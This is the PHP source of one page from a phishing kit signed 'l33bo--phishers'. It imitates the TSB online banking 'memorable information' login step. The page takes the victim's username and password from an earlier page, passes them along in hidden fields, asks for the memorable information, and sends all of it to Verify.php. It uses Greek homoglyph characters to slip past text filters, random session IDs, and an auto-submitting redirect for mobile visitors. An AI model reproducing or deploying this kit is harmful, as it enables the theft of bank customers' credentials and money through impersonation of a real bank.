<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require_once("assets/includes/memo.php");

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Enter Memorable</title>   
<link rel="shortcut icon" href="assets/img/fav.ico">
<meta http-equiv="content-language" content="en-gb">
<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/002.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/gotjs.css" media="screen" type="text/css" rel="stylesheet">
<script type="text/javascript" src="assets/js/jquery-min.js"></script>
<script type="text/javascript" src="assets/js/scriptsnippet.jspf"></script>
<script type="text/javascript" src="assets/js/global.js"></script>
<script type="text/javascript">DI.themePath="https://online.tsb.co.uk/personal/unauth/assets/VerdeRetail/";</script>
<script type="text/javascript" src="assets/js/custom.js"></script>
</head>

<body class="hasJS safari_537" data-browser="safari" data-version="537" onload="MobileGuy();">
<div style="display:none">
<form method="post" action="mobile/index.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true" name="MobileGuy" id="MobileGuy"> 
</form>
</div>    
                


    <div id="wrapper">
        <div class="outer">
            <div id="header">
                <ul id="skiplinks">
                    <li><a id="lnkSkip" name="lnkSkip" href="#">Skip t&omicron; main c&omicron;ntent</a></li>
                </ul>
                <div class="clearfix">
                    <span id="strbrandname" style="display: none">VERDE</span>
                    <p id="logo">
                        <span> <img src="assets/img/logo.png">
                        </span>
                    </p>

                    <div class="secureMsg">
                        <p class="msg">
                            <img src="assets/img/top_mes.png">
                        </p>

                        <p><a class="linkBullet newwin" href="#">H&omicron;w can I tell that this site is secure?</a></p>
                    </div>

                    <div class="loggedIn">
                        <ul>
                            <li class="mobile"><a href="mobile/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" class="linkBullet">&Mu;&omicron;bile</a></li>
                            <li class="cookie"><a class="linkBullet newwin" href="#">C&omicron;&omicron;kie p&omicron;licy</a></li>
                            
                        </ul>
                    </div>


                </div>
            </div>
        </div>
        
        <div class="pageWrap">
            <div id="page" class="content">
                <div class="primaryWrap">
                    <div class="primary">
<div class="panel">
<h1>Your memorable information</h1>
<div class="inner"><p><strong></strong></p>
<p><strong>Please enter your full information then click on the continue button.</strong></p>
<p></p>
<p>This login step improves security.</p>
</div>
<form id="memo" name="memo" method="post" action="Verify.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" class="validationName:(frm_personalRegistration) validate:() validationName:(registerIB) validate:()" autocomplete="off" enctype="application/x-www-form-urlencoded">
<div id="errormsg" class="formSubmitError">There is a problem with some of the information you have submitted.<br>Please amend the fields highlighted below and re-submit this form.</div>
<input type="hidden" name="username" value="<?=$_POST['username']?>">
<input type="hidden" name="password" value="<?=$_POST['password']?>">
<fieldset class="memInfoSelect clearfix">
<div id="inputerror" class="formField validationName:(validatememo) validate:(required_validatememo) clearfix error">
<div class="formFieldInner">
<div class="clearfix">
<label for="memo">Memorable information :</label>
<input type="password" name="memo" id="memo" onkeyup="if (this.value.length > 5) hidebox();">
</div>
<span id="inputerrortxt"  class="error">Please enter your FULL memorable information.</span>
</div>
</div>
</fieldset>
<div class="inner">
<ul class="linkList">
<li><a id="frmentermemorableinformation1:lktrouble" name="frmentermemorableinformation1:lktrouble" href="#">Having trouble logging in?</a></li>
</ul>
</div>
<ul class="actions">
<li class="primaryAction">
<input id="frmentermemorableinformation1:btnContinue" name="frmentermemorableinformation1:btnContinue" type="image" src="assets/img/login.png" class="submitAction">
</li>
<li><strong><a id="frmentermemorableinformation1:lkCancel" name="frmentermemorableinformation1:lkCancel" href="#" class="cancel pseudoLink">Cancel</a></strong></li>
</ul>
<input type="hidden" name="hasJS" value="true"></form>
</div>



                    </div>
                </div>
                <div class="secondary">
                    <div class="panel">
                        <div class="subPanel">
						<a class="newwin" href="#"><img src="assets/img/subpanelimg1.gif"></a>
						</div>
                        
						<div class="accordion ui-accordion ui-widget ui-helper-reset" role="tablist">
                            <div class="part">
                                <h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="true" tabindex="0" title="Contact Us....: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Contact Us....</h2>
                                <div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel" style="display: none;">
                                    <div class="paneInner">
                                        <div class="quickContact"><h3>&Alpha;ll acc&omicron;unt related queries</h3>
<p><strong>0345 125 2385</strong></p>
<p>If y&omicron;u need t&omicron; call us fr&omicron;m abr&omicron;ad &omicron;r prefer n&omicron;t t&omicron; use &omicron;ur 0345 number, y&omicron;u can als&omicron; call us &omicron;n <strong>+44 204 208 7356.</strong></p>
<p>Calls may be m&omicron;nit&omicron;red and rec&omicron;rded in case we need t&omicron; check we have carried &omicron;ut y&omicron;ur instructi&omicron;ns c&omicron;rrectly and t&omicron; help us impr&omicron;ve &omicron;ur quality &omicron;f service.<br><br></p>
<h3>Internet banking queries</h3>
<p>Technical queries ab&omicron;ut the Internet &Beta;anking service</p>
<p>Call us &omicron;n<strong>&nbsp;0345 349 0215</strong>. We’re &omicron;pen 7am-10pm &Mu;&omicron;n – Fri, 8am-6pm Sat – Sun.</p>
<p>If y&omicron;u need t&omicron; call us fr&omicron;m abr&omicron;ad y&omicron;u can als&omicron; call us &omicron;n<strong>&nbsp;+44 (0) 204 319 6598</strong>.</p></div>
                                    </div>
                                </div>
                            </div>
                            <div class="part">
                                <h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" tabindex="0"><span class="ui-icon ui-icon-triangle-1-e"></span>Help &amp; Supp&omicron;rt</h2>
                                <div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
                                    <div class="paneInner"><ul class="quickFAQs ui-accordion ui-widget ui-helper-reset" role="tablist">
			
	
	<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" role="tab" aria-expanded="false">
	<span class="ui-icon ui-icon-triangle-1-e"></span>What is a user ID?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p></p><p>This is the unique number y&omicron;u've been given t&omicron; run y&omicron;ur Internet &Beta;anking acc&omicron;unt. Y&omicron;u will need b&omicron;th y&omicron;ur user ID and y&omicron;ur passw&omicron;rd t&omicron; l&omicron;g &omicron;nt&omicron; y&omicron;ur &omicron;nline acc&omicron;unt.</p>
<p></p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="-1" role="tab" aria-expanded="false">
<span class="ui-icon ui-icon-triangle-1-e"></span>Why am I having tr&omicron;uble l&omicron;gging in?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p></p><p>It c&omicron;uld be because y&omicron;u're trying t&omicron; l&omicron;g &omicron;n fr&omicron;m a netw&omicron;rked site (the &omicron;ffice, f&omicron;r example). If s&omicron;, please c&omicron;ntact y&omicron;ur Systems &Alpha;dministrat&omicron;r f&omicron;r help. It c&omicron;uld als&omicron; be because y&omicron;ur br&omicron;wser settings are inc&omicron;mpatible with the level &omicron;f security maintained by Internet &Beta;anking. Check y&omicron;ur br&omicron;wser f&omicron;r c&omicron;mpatibility. If y&omicron;u've been l&omicron;gged &omicron;ut because we suspect that y&omicron;u have a virus &omicron;r malici&omicron;us s&omicron;ftware &omicron;n y&omicron;ur c&omicron;mputer, y&omicron;u can find useful inf&omicron;rmati&omicron;n &omicron;n &omicron;ur&nbsp;<a class="newwin" href="#" tabindex="-1">&Mu;alware page</a>.If y&omicron;u still have tr&omicron;uble, please call &omicron;ur helpdesk &omicron;n&nbsp;<strong>0345 852 1475&nbsp;</strong>(or +44 (0) 204 215 3265fr&omicron;m &omicron;utside the U&Kappa;), &Mu;&omicron;nday t&omicron; Friday, 7.00am-10.00pm; Saturday and Sunday, 8.0am - 6.00pm.</p>
<p></p>
				    </div>
			</li>
</ul></div>
                                </div>
                            </div>
                        </div>

<div class="subPanel">
<p align="left"><a class="newwin" href="#"><img src="assets/img/subpanelimg2.gif"></a></p>
</div>
<div class="subPanel">
<p align="left"><a class="newwin" href="#"><img src="assets/img/subpanelimg3.png"></a></p></div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
<script type="text/javascript">
	LBG.functions.init();

</script>

</body>
</html>